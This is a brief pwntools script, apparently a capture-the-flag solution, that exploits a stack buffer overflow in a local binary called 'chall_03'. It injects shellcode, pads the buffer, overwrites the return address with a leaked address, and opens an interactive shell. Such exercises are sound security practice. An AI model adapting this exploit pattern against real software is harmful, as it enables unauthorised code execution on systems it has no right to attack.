# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_03")
    context.arch= "amd64"
    proc.recvuntil(":)")
    asm_shell= asm(shellcraft.sh())
    len_shell=len(asm_shell)
    overflow= proc.recv()
    main= int(overflow, 16)
    p= (asm_shell+ b'a'* (0x140-len_shell)+ b'a'*8 + p64(main))
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
